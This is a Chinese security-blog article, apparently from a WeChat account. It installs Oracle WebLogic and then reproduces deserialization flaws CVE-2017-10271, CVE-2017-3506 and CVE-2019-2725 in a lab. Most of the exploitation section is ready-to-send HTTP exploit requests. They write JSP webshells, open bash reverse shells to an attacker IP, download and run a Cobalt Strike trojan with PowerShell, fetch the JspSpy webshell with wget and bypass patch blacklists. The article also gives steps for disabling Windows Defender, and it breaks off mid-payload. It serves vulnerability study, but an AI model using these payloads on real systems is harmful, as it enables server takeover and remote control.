<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/r_ifxjyu5BiiZoB8n9GoEA)

**免责声明**

由于传播、利用本公众号狐狸说安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号狐狸说安全及作者不为**此**承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！

### **0x01 **Weblogic 简介****

Weblogic 是美国 Oracle 公司出品的应用服务器软件，确切的说这是基于 Java EE 架构的中间件，主要用于开发、继承、部署和管理大型分布式 web 应用、网络应用和数据库应用。Weblogic 将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的 Java 应用服务器软件之一，也是世界上第一个成功商业化的 Java EE 应用服务器，当然 Weblogic 具有可扩展性、快速开发、灵活可靠等优势，其默认端口为 7001，目前比较活跃的版本为 10 和 12，最新版本为 14。

在功能性上，Weblogic 是 Java EE 的全能应用服务器，包括 EJB、JSP、servlet、JMS 等，是商业软件中排名第一的容器（JSP、servlet、EJB 等），并提供其他工具（例如 Java 编辑器），因此也是一个综合的开发以及运行环境。在扩展性上，Weblogic Server 凭借出色的群集技术，拥有处理关键 web 应用系统问题所需的性能、扩展性和高可用性。Weblogic Server 既实现了网页集群，也实现了 EJB 组件群集，而且不需要任何专门的硬件或操作系统支持。网页群集可以实现透明的复制、负载平衡以及表示内容容错。无论是网页群集还是组建群集，对于电子商务解决方案所要求的可扩展性和可用性都是至关重要的。

### **0x02 **Weblogic 安装****

```
下载地址：https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.htm

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibCicQVVr2SNdRfbDz2Xw7dhj6e9vXaic3o29hxAZORwHQ5Wiar0ibLNAp8A/640?wx_fmt=png)

Weblogic 最新的版本需要 jdk1.8 以上，如果 jdk 版本为 1.8 以下，可能会出现无法安装的情况。经过测试 weblogic 版本为 12.1.3 可在 jdk 1.7 版本下可以安装。而 weblogic 版本为 10.3.6 及以下可在 jdk 1.6 版本下可以安装。

**weblogic 10.3.6 安装**

在官网下载模块中选择一个版本进行下载

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibnkrdcRuHgjxwN4hst4z13YKruultibOeOZ7URNufTel9ZPMWknKOOpw/640?wx_fmt=png)

我选择的是 10.3.6 的 Generic 版本

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibCKcllUTPk5hXFRuqmx8q8WyAr76TAGdArLECzW7ib12kwFqoZVKribww/640?wx_fmt=png)

1、开始安装 weblogic，直接开始下一步

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibYvLUJxXD7qhgG1RtjkAsOd9QYFquViaGtXGYEsQLicGAq6jByyMl3trw/640?wx_fmt=png)

2、选择典型进行安装

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibyediaoNQryTb9tNIz7kf9fLXETZUBnM2ZvJ9IF5KIqXDmSrga4I34pw/640?wx_fmt=png)

3、查看相关概要后继续下一步

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibknA2wx8A64KXMibTqaT86CY3Bcnrial3LWJmcaxNBSVO6f7oGF8lxkNw/640?wx_fmt=png)

4、安装完成 weblogic

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibXmDC8sbQPAD0vP49yicWKibpjtshYKzz8a4EyDIebhJxGC7QJEn2PveA/640?wx_fmt=png)

5、点击开始 weblogic server

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibr2LIIDBibbp0oYNpq6yUKlheVbBh1w4UwqePspBxv8rFSYNpz2uwjJw/640?wx_fmt=png)

6、创建新的 weblogic 域

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibmkCEdp93qicUGnHF07xGm0KRnlHwojKnhjrskJkB1Xlia7Ud0MVouNCA/640?wx_fmt=png)

7、生成自动配置的 weblogic 域，点击下一步

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibicyDqVJicgRBCd928Fc5oszIU31n2e4pJT9PO39QjXQoT2WEAGdibLj8w/640?wx_fmt=png)

8、选择默认的域名和域位置即可

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib3zLHuQ9AVFdykHibiaTk9kU0UfhJqH8ib2aSzIs51MznB38jWjOwZQrug/640?wx_fmt=png)

9、设置账号密码为 weblogic/admin123.  

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib6rmSpggkMyCibj48oxtqV5jGr6W5kiaPSy3wNyicZ4yWQugWZy4Q4GfCw/640?wx_fmt=png)

10、选择开发默认，并制定可用的 jdk 版本

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib0ibd7eMWZrtCZrqkWgFiaKoFwM3pvibruwWq9s5aOaA32kzKCA5ficvucg/640?wx_fmt=png)

11、点击管理服务器和受管服务器、集群和计算机

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibiaggYYKMW5Q44LTibhgaW8LS6eHR90eLqNMLDmpVBLicSZoGjk37CCe8w/640?wx_fmt=png)

12、访问端口和网络都为默认配置

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibWEBf0oNCceKfqV0rFJHLINzwB3RsAcSIicL8hsNpUB2IvIFDExNBNUw/640?wx_fmt=png)

13、之后安装完成

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibQ0ibFMbAelfsp7EgdCwqGxIrdeAv6m5uY5rT6SGtfvZGd37w7gN6ibxA/640?wx_fmt=png)

14、找到启动 cmd 文件，点击开启 Weblogic

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibKekMlTiaoAicRQCAhMGoURcduuKIHfILfvqQTps2Ybn2kLic8fF9EEL8Q/640?wx_fmt=png)

15、填入账号密码后成功开启 Weblogic

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibVVUP7ibDibjQ8I8oXdYvAw0cbVLh0FnYCUgT1Zn0Q4hGq94Q2RXNcUUg/640?wx_fmt=png)

16、访问 http://192.168.0.105:7001/，开启成功

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibEcVoXykBibnl9Ds4Po14OQQJxhLsFibQTv3voPG1MZZKak9oK4OUQf5g/640?wx_fmt=png)

控制台地址为 http://192.168.0.105:7001/console/

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibCNl09WPaVb6IgnOSRHQfvYib6C7ZVWFBAK8Lj1DJvgCrw94rCOuCxpA/640?wx_fmt=png)

**weblogic 12.1.3 安装**

Weblogic 12 版本的安装与 10 版本的安装稍微有些不同，可安装 jdk 后运行以下命令进行安装

```
java -jar fmw_12.1.3.0.0_wls.jar

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibm1kDJaPzDpia2CvvepDjNgMgpLAVNk17kHiatWjsyeibgYh9RheMBOz7A/640?wx_fmt=png)

如果执行报错，是因为 Windows 默认会使用 jre 环境，而不是 jdk 环境，可将其放置到 jdk 环境下再运行

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibiaT33PaR3PmYQJBzqFyZVEYdKuSE5JR1XEGicAoOamQwqO8ppr7VWcew/640?wx_fmt=png)

1、开始安装 Weblogic

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibib1QtCOch3cwZ9Y8FEAuCxmw0cOSqXunR2jLZwSiaBykWpjgLxeQUjbQ/640?wx_fmt=png)

2、一直下一步到此点击安装完成 

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibSzr8EU4p9Yb3R178dlJGxibTJLznNgWIg1KjIvIpneOvpfEpNicKpvBA/640?wx_fmt=png)

3、开始配置 Weblogic 域 

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibRhmY9jZ8TnqK4Pt620FNKMK9u1axqjbBRELFmRr2qYDWqoPhu5uqAg/640?wx_fmt=png)

4、设置账号密码为 weblogic/admin123. 

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibsJZciclISPrKqcicWTQ2l5NhMPXM0lrNGK4biagQ4RAl6N21JeulKsP0Q/640?wx_fmt=png)

5、选择生产模式 

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibvYia5z7INr2otlBPNTXUHXKwibzIQn1O5mzcf7icIxIibrKiaLiblknyhPibw/640?wx_fmt=png)

6、配置节点管理器和管理服务器 

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibG9ykrNU96yjKgIuf65o7IsjJf60gOQKicPsQialWevQoWDRx3SmYBnWQ/640?wx_fmt=png)

7、选择默认管理服务器配置 

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibibFVnXfO2T2q5ibmLglPuu4ibBCpWN3BO3cLteVKGUibw0eicq9kibO4Yraw/640?wx_fmt=png)

8、一直下一步即可安装完成 

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibUuIGDaMNmoDTJsT0kCgXcgw02hj9YONcrYiaicK93ia3WnJictL1CNooRg/640?wx_fmt=png)

9、找到启动 cmd 文件，点击后开启 Weblogic 

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibq37cWBCDfa4mFWGN2ONrNeOZTFQ291NdnXq3eXeCSFrB3Nn4Wics4LA/640?wx_fmt=png)

10、运行需输入之前的账号密码 

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib4Hqn2uXla0y6uW4mUJSDAoLxYhtTr0oMC8qlZIwPUApEhr82srHSDg/640?wx_fmt=png)

11、访问 http://192.168.0.111:7001/，开启成功

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibQuZ7KaicZEwjkunarEWUHYsN2Q1h1Gm3cHqMDwFARtp326CHcQjLTdw/640?wx_fmt=png)

12 版本的控制台界面与 10 版本也略有不同，在渗透时可轻易分辨

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibvibjWjy7WkKdKEYUKVY5PIBWhgzAiaQhXBns2aPBbfcuGgESicyMCKvUw/640?wx_fmt=png)

### **0x03 **Weblogic 漏洞复现****

**XMLDecoder 反序列化漏洞（CVE-2017-10271 & CVE-2017-3506）**

**漏洞原理**

Weblogic 的 WLS Security 组件对外提供 webservice 服务，其中使用了 XMLDecoder 来解析用户传入的 XML 数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。

**漏洞利用**

访问 http://192.168.0.105:7001/wls-wsat/CoordinatorPortType 验证漏洞是否存在，访问成功说明漏洞可能存在

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibbAEIktQ00OH3O5RlSu7JGcjQ1BEbuToZYc1nmQ7WKHS9wOtISc9COg/640?wx_fmt=png)

该漏洞不仅存在于 / wls-wsat/CoordinatorPortType 中，只要是在 wls-wsat 包中的 URI 均受到影响在 web.xml 可找到所有受影响的 URL 路径。

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibibZZm7wke0SnC5gemVeM95lwsRaibMs9RKZxNVPwPPN6xibz7gicYXSFfg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibibZZm7wke0SnC5gemVeM95lwsRaibMs9RKZxNVPwPPN6xibz7gicYXSFfg/640?wx_fmt=png)

经整理后受到影响的路径包括如下：

```
/wls-wsat/CoordinatorPortType
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/ParticipantPortType
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/ParticipantPortType11
/wls-wsat/RegistrationRequesterPortType11

```

构造 HTTP 请求包如下，需要注意的是 Content-Type 应改为 text/xml，否则会导致 XMLDecoder 不解析。

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.0.105:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 642
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0">
    <object>
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/mac.jsp</string>
    <void method="println">
<string>
    <![CDATA[
<% out.print("hello"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibNA34OpZ4JhPqAFJT8ehAN6LuXbZan6ghq8R6NT0sMQc50NwefLWOicw/640?wx_fmt=png)

访问 http://192.168.0.105:7001/bea_wls_internal/mac.jsp，成功输出 hello

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibLSdf8SorUiaHeO1uUERzVgbqIBkNv3wNhLMoKD9zdic1DFxopMaiaXiabw/640?wx_fmt=png)

同时在目标靶机中已存在该文件

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibKiaSpPObWiaHxVa5Xick2BDanTvmdHm5JN7waGVC34ltJceCict1EHl17w/640?wx_fmt=png)

```
需要注意的是如果`Windows Defender`开启状态下，尽管文件存在，但是无法访问到写入的 jsp 文件

```

使用以下方式可关闭 Windows Defender

```
1、win+R 输入 gpedit.msc
2、依次点击展开计算机策略→管理模板→Windows组件→Windows Defender 
3、禁用 Windows Defender

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibVVQ1r6AzuuhpRXGKWwyZvhP0NhCI3LpOgauKdOlCMK2wEBNjAuTic9w/640?wx_fmt=png)

**linux 反弹 shell**

使用 vulhub 中 CVE-2017-10271 的环境进行搭建

```
cd vulhub/weblogic/CVE-2017-10271
docker-compose up -d

```

构造如下 payload 用于反弹 shell

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.0.107:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 633
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0">
<void>
<array length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i >& /dev/tcp/192.168.0.50/6666 0>&1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibot7RSySBfb9DLPgJH1UeFu6ATqzgicRXLRsJaQxtFrJz19MfpNr9khg/640?wx_fmt=png)

成功拿到反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibH2Yno2B9kCaFz8LdcPvGUSsXF81iaUNvic3NffMbibOy5AP0wS4ER2qOw/640?wx_fmt=png)

**windows 上线 CS**

在 CS 上生成 exe 类型木马

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibpwuLJqEHwZsTThlxR7jYX42U2saQljXTls6343BErqy9adHcJ61tEw/640?wx_fmt=png)

在本地开启 http 服务

```
python -m SimpleHTTPServer 80

```

发送 payload 运行木马上线 CS

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.0.105:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 897
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0">
<void>
<array length="3">
<void index="0">
<string>powershell</string>
                        </void>
                        <void index="1">
                            <string>-Command</string>
                        </void>
                        <void index="2">
                            <string>(new-object System.Net.WebClient).DownloadFile('http://192.168.0.100/mac.exe','mac.exe');start-process mac.exe</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibmkBia03W4Xv6CXnfXOR6v4diaXiaLQ47vEicdovLRffMIQe9iaibAbxk1O1A/640?wx_fmt=png)

成功上线 CS

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibbRZViabs4DxBbTTevRpH877VTPxFW1SVRUDoPtRViaLjqSzuib9Vp8JmQ/640?wx_fmt=png)

针对 CVE-2017-3506 的补丁加了验证函数，具体是在 weblogic/wsee/workarea/WorkContextXmlInputAdapter.java 中添加了 validate 方法，以此来验证 payload 中的节点是否存在 object Tag，其源码如下：

```
 private void validate(InputStream is){
      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
      try {
         SAXParser parser =factory.newSAXParser();
         parser.parse(is, newDefaultHandler() {
              public void startElement(String uri, StringlocalName, String qName, Attributes attributes)throws SAXException {
                 if(qName.equalsIgnoreCase("object")) {
                    throw new IllegalStateException("Invalid context type: object");
                 }
} });
        } catch(ParserConfigurationException var5) {
           throw new IllegalStateException("Parser Exception", var5);
        } catch (SAXExceptionvar6) {
           throw new IllegalStateException("Parser Exception", var6);
        } catch (IOExceptionvar7) {
           throw new IllegalStateException("Parser Exception", var7);
} }

```

绕过方法也非常简单，只需要将修改为即可，如下所示：

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0">
    <object>
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/mac.jsp</string>
    <void method="println">
<string>
    <![CDATA[
<% out.print("hello"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>

```

除此之外其他都与 CVE-2017-3506 的 payload 相同，同样可以执行反弹 shell、上线 CS

**漏洞修复**

更新 Oracle 官方补丁，补丁地址为

https://www.oracle.com/security-alerts/cpuoct2017.html

修复过程可参考

https://www.oracle.com/security-alerts/cpuoct2017.html

**wls-wsat 反序列化远程代码执行漏洞（CVE-2019-2725）**

漏洞原理

由于在反序列化处理输入信息的过程中存在缺陷，未经授权的攻击者可以发送精心构造的恶意 HTTP 请求，利用该漏洞获取服务器权限，实现远程代码执行。影响组件主要为 bea_wls9_async_response.war 和 wsat.war

**影响版本：**

```
10.*
12.1.3

```

**漏洞利用**

访问 /_async/AsyncResponseService 验证漏洞是否存在

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib6sibXeupYxg7A1iamzmSeeTb2bHpb00qYCVecicR6WpAxicVDeV3bNCaAg/640?wx_fmt=png)

同样地该漏洞不仅存在于 /_async/AsyncResponseService 中，只要是在 bea_wls9_async_response 包中的 URI 均受到影响，在 web.xml 可找到所有受影响的 URL 路径。

```
C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\WEB-INF\web.xml

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibrmSExYcAvvibTD0iaQjjK7awlS8yBgPPNzTnoeSqicEK8euvqUCmO0zNQ/640?wx_fmt=png)

所有受影响的 URL 包括如下：

```
/_async/AsyncResponseService
/_async/AsyncResponseServiceJms
/_async/AsyncResponseServiceHttps

```

其实 CVE-2017-3506 补丁是过滤了，其实现方法为在调用 startElement 方法解析 XML 的过程中如果解析到 Element 字段值为 Object 就抛出异常，但这类基于黑名单的防护措施很容易被绕过，比如以下代码中不包含任何 Object 元素，但经过 XMLDecoder 解析后依然能够执行代码，形成了新漏洞 CVE-2017-10271

```
<java version="1.4.0">
    <new>
        <string>calc</string><method  />
    </new>
</java>

```

于是 CVE-2017-10271 补丁文件继续将 object、new、method 等关键字继续加入到黑名单当中，同样一旦解析 XML 元素过程中匹配到上述任意一个关键字就立即抛出运行时异常。但它针对 void 和 array 这两个元素是有选择性的抛异常，其中当解析到 void 元素后，还会进一步解析该元素中的属性名，若没有匹配上 index 关键字才会抛出异常。而针对 array 元素而言，在解析到该元素属性名匹配 class 关键字的前提下，还会解析该属性值，若没有匹配上 byte 关键字，才会抛出运行时异常，补丁文件如下：

```
public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
            if(qName.equalsIgnoreCase("object")) {
               throw new IllegalStateException("Invalid element qName:object");
            } else if(qName.equalsIgnoreCase("new")) {
               throw new IllegalStateException("Invalid element qName:new");
            } else if(qName.equalsIgnoreCase("method")) {
               throw new IllegalStateException("Invalid element qName:method");
            } else {
               if(qName.equalsIgnoreCase("void")) {
                  for(int attClass = 0; attClass < attributes.getLength(); ++attClass) {
                     if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) {
                        throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass));
                     }
                  }
               }
               if(qName.equalsIgnoreCase("array")) {
                  String var9 = attributes.getValue("class");
                  if(var9 != null && !var9.equalsIgnoreCase("byte")) {
                     throw new IllegalStateException("The value of class attribute is not valid for array element.");
                  }

```

本次反序列化漏洞绕过以往补丁的关键点在于利用了 Class 元素指定任意类名，因为 CVE-2017-10271 补丁限制了带 method 属性的 void 元素，所以不能调用指定的方法，而只能调用完成类实例化过程的构造方法。在寻找利用链的过程中发现 UnitOfWorkChangeSet 类构造方法中直接调用了 JDK 原生类中的 readObject() 方法，并且其构造方法的接收参数恰好是字节数组，这就满足了上一个补丁中 array 标签的 class 属性值必须为 byte 的要求，再借助带 index 属性的 void 元素，完成向字节数组中赋值恶意序列化对象的过程，最终利用 JDK 7u21 反序列化漏洞造成远程代码执行。总的来说以上方法巧妙地利用了 void、array 和 Class 这三个元素，成功的打造出新的利用链，并再次绕过 CVE-2017-10271 补丁限制。

在 Weblogic 10.3.6 中利用

```
oracle.toplink.internal.sessions.UnitOfWorkChangeSet

```

构造函数执行 readObject()，其源码如下：

```
public UnitOfWorkChangeSet(byte[] bytes) throws java.io.IOException, ClassNotFoundException {
      java.io.ByteArrayInputStream  byteIn = new java.io.ByteArrayInputStream(bytes);
      ObjectInputStream objectIn = new ObjectInputStream(byteIn);
   //bug 4416412: allChangeSets set directly instead of using setInternalAllChangeSets
      allChangeSets = (IdentityHashtable)objectIn.readObject();
      deletedObjects = (IdentityHashtable)objectIn.readObject();
      }

```

UnitOfWorkChangeSet 中的参数是 Byte 数组，因此需将 payload 转换为 Byte 数组才能完成执行，构造 payload 如下：

```
POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.0.107:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Length: 852
Accept-Encoding: gzip, deflate
SOAPAction:
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml
cmd:whoami
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void>
<array length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>wget http://192.168.0.100/JspSpy.jsp -O servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/mac.jsp
</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
  <asy:onAsyncDelivery/>
  </soapenv:Body></soapenv:Envelope>

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib5vdEOPOXNFEENAIclrLTPSckRyiawctyrsZZ0Nnnrq2iaZul47yJNshw/640?wx_fmt=png)

访问 http://192.168.0.107:7001/bea_wls_internal/mac.jsp 发现木马已经存在，需要注意的是如果将其放在 bea_wls9_async_response/8tpkys/war 下则访问_async / 目录，如果放在 bea_wls_internal/9j4dqk/war 下则访问 bea_wls_internal / 目录

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibpujibzmMp9I1WxZsOlw8GnfMP4KtRPnXddVicQlHCIFhAQYaDtQib6yuQ/640?wx_fmt=png)

输入默认密码`Ninty`可进入管理

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibwVibhVdO4vZ8icaen8aAlG0Le4IeHAHibrHk1KPxDuU0icScLIjyDh9YgA/640?wx_fmt=png)

**linux 反弹 shell**

构造 payload 用于反弹 shell

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void>
<array length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i >& /dev/tcp/192.168.0.50/6666 0>&1
</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
  <asy:onAsyncDelivery/>
  </soapenv:Body></soapenv:Envelope>

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibbzCQAXibMuArliaNTX8LAomwAhTiaRF6RuL5er4WeQk6LyyzOSMEXJPiag/640?wx_fmt=png)

成功拿到反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibA3XXnwteicLFPXFDBGoia5qjAxEv9wNqCrGQorqib3Nag8avvTqn1DL2w/640?wx_fmt=png)

**windows 上线 CS**

构造 payload 上线 CS

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
